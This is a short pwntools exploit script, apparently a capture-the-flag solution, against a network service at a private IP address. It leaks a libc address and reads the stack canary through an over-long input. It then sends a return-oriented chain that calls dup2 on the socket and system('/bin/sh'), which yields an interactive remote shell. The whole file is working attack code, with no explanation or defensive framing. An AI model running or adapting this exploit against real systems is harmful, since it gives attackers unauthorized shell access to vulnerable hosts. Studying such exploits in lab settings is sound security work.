from pwn import *

context.log_level =True

#=========================================================

local=False

if local:
    p = process("")
    pause()
else:
    HOST = "10.100.16.121"
    PORT = 4242
    r = remote(HOST,PORT)
    pause()

#=========================================================
print r.recvuntil(">")
r.sendline("1")
leak = int(r.recvline().split(":")[1],16)

prdi = p64(0x004012e3)
prsi = p64(0x004012e1)
system = p64(leak-0x292d0)
binsh = p64(leak+0x10d063)
dup2 = p64(leak+0x7c630)

print r.recvuntil(">")
r.sendline("2")
print r.recvuntil(">")
r.sendline("A"*311)

canary = r.recvuntil(">")[312:320]
print canary

r.sendline("2")
print r.recvuntil(">")

r.sendline("A"*312+canary+"B"*8+prdi+p64(4)+prsi+p64(0)+p64(0)+dup2+prdi+p64(4)+prsi+p64(1)+p64(1)+dup2+prdi+binsh+system)
r.interactive()
